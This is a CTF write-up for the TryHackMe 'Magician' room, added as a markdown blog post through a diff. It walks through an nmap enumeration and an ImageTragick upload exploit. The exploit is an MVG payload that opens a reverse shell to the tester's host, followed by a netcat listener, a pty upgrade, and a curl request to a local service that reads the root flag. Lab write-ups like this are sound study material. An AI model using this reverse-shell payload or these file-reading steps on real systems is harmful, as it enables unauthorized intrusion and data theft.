@@ -1,0 +1,147 @@
+---
+title: "Magician TryHackMe"
+date: "08-07-2021"
+author: "Reda BELHAJ"
+summary: "This magical website lets you convert image file formats, room from TryHackme reated by M0N573R777 and ripcurlz."
+tags: ["Tryhackme", "Ctf", "Writeup"]
+image: "/images/Magician/bg.jpg"
+---
+Let’s take a look at the [Magician CTF](https://tryhackme.com/room/magician) on TryHackMe.
+Let’s first add the hostname to our `/etc/hosts` file, as told in the room:
+
+```
+echo "10.10.244.57 magician" | sudo tee -a /etc/hosts
+```
+
+## Enumeration
+### Nmap Scan
+The first step of my enumeration was a nmap scan. by the command:
+
+```
+nmap -sC -sV -T4 -p- -oN nmapscan magician
+```
+
+```
+PORT     STATE SERVICE    REASON         VERSION
+21/tcp   open  ftp        syn-ack ttl 63 vsftpd 2.0.8 or later
+8080/tcp open  http-proxy syn-ack ttl 63
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 
+|     Vary: Origin
+|     Vary: Access-Control-Request-Method
+|     Vary: Access-Control-Request-Headers
+|     Content-Type: application/json
+|     Date: Fri, 06 Aug 2021 21:15:35 GMT
+|     Connection: close
+|     {"timestamp":"2021-08-06T21:15:35.319+0000","status":404,"error":"Not Found","message":"No message available","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}
+|   GetRequest: 
+|     HTTP/1.1 404 
+|     Vary: Origin
+|     Vary: Access-Control-Request-Method
+|     Vary: Access-Control-Request-Headers
+|     Content-Type: application/json
+|     Date: Fri, 06 Aug 2021 21:15:34 GMT
+|     Connection: close
+|     {"timestamp":"2021-08-06T21:15:34.270+0000","status":404,"error":"Not Found","message":"No message available","path":"/"}
+|   HTTPOptions: 
+|     HTTP/1.1 404 
+|     Vary: Origin
+|     Vary: Access-Control-Request-Method
+|     Vary: Access-Control-Request-Headers
+|     Content-Type: application/json
+|     Date: Fri, 06 Aug 2021 21:15:34 GMT
+|     Connection: close
+|     {"timestamp":"2021-08-06T21:15:34.678+0000","status":404,"error":"Not Found","message":"No message available","path":"/"}
+|   RTSPRequest: 
+|     HTTP/1.1 505 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 465
+|     Date: Fri, 06 Aug 2021 21:15:34 GMT
+|     <!doctype html><html lang="en"><head><title>HTTP Status 505 
+|     HTTP Version Not Supported</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 505 
+|_    HTTP Version Not Supported</h1></body></html>
+|_http-title: Site doesn't have a title (application/json).
+8081/tcp open  http       syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
+|_http-favicon: Unknown favicon MD5: CA4D0E532A1010F93901DFCB3A9FC682
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: magician
+```
+The “Nmap Output” displayed `3` services running under ports 21, 8080 and 8081.
+
+## Exploring 
+Navigating to the services:
+- we got first a **FTP service** and I tried to connect to it as anonymous:
+![FTP](/images/Magician/ftp.jpg)
+- Browsing to http://magician:8080 we got a whitelabel error page and indicates that there's no explicit mapping for /error
+- Browsing to http://magician:8081 we got a web application that let us convert image file formats and with the hint that we got from FTP:
+
+```
+The door just opens after some time? You're quite the patient one, aren't ya, it's a thing called 'delay_successful_login' in /etc/vsftpd.conf ;) Since you're a rookie, this might help you to get started: https://imagetragick.com. You might need to do some little tweaks though...
+```
+
+## Exploiting
+After some research I've got a [github repo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Picture%20Image%20Magik#exploit-v1) that let me  exploit the web app:
+
+```
+push graphic-context
+encoding "UTF-8"
+viewbox 0 0 1 1
+affine 1 0 0 1 0 0
+push graphic-context
+image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/10.8.174.180/4444 0<&1 2>&1'
+pop graphic-context
+pop graphic-context
+```
+![Payload](/images/Magician/payload.jpg)
+
+Then I opened a netcat listener and upload the image:
+
+```
+nc -nlvp 4444
+```
+
+## User Flag
+In our listener window, a reverse shell appears and I tried to upgrade NC shell with [Python](https://zsecure.uk/guides/upgrade-nc-shell-with-python-3/):
+
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+And I got the flag :
+
+```
+THM{******************}
+```
+
+## Root Flag
+For the root flag I was thinking a privilege escalation but the hint led to another path:
+
+```
+The magician is known to keep a locally listening cat up his sleeve, it is said to be an oracle who will tell you secrets if you are good enough to understand its meows.
+```
+So I checked the network connections with netstat command:
+
+```
+netstat -anp
+```
+
+![Netstat](/images/Magician/netstats.jpg)
+
+So first I tried to access the source code of the web app in the port **6666** with curl command. Then I got a form and an input with the name and the id of `filename` so I tested the root flag file:
+
+```
+curl -X POST http://127.0.0.1:6666 -d "filename=/root/root.txt"
+```
+
+And I got a encoded data its seems like **ROT13** algorithm:
+
+```
+echo "GUZ{******************}" | tr '[A-Za-z]' '[N-ZA-Mn-za-m]'
+```
+
+```
+THM{******************}
+```
